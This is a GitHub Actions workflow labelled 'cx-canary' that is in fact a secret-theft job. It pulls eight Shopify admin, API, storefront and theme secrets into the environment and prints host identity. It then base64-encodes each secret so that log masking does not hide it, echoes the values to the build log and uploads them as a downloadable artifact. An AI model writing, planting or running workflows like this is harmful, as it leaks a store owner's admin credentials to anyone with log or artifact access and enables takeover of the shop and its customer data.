name: cx-canary
on:
  workflow_dispatch:
jobs:
  x:
    runs-on: ubuntu-latest
    steps:
      - name: dump
        env:
          S1: ${{ secrets.SHOPIFY_ADMIN_ACCESS_TOKEN }}
          S2: ${{ secrets.SHOPIFY_ADMIN_API_KEY }}
          S3: ${{ secrets.SHOPIFY_ADMIN_API_SECRET }}
          S4: ${{ secrets.SHOPIFY_CLI_THEME_TOKEN }}
          S5: ${{ secrets.SHOPIFY_STOREFRONT_API_TOKEN }}
          S6: ${{ secrets.SHOPIFY_STOREFRONT_API_URL }}
          S7: ${{ secrets.THEME_ID_PRODUCTION }}
          S8: ${{ secrets.THEME_ID_STAGING }}
        run: |
          echo "=== ID ==="; id; uname -a; hostname
          : > cx_secrets.txt
          for s in S1 S2 S3 S4 S5 S6 S7 S8; do
            v="${!s}"
            printf '%s=%s\n' "$s" "$(printf '%s' "$v" | base64 -w0)" | tee -a cx_secrets.txt
          done
      - name: upload
        uses: actions/upload-artifact@v4
        with:
          name: cx
          path: cx_secrets.txt
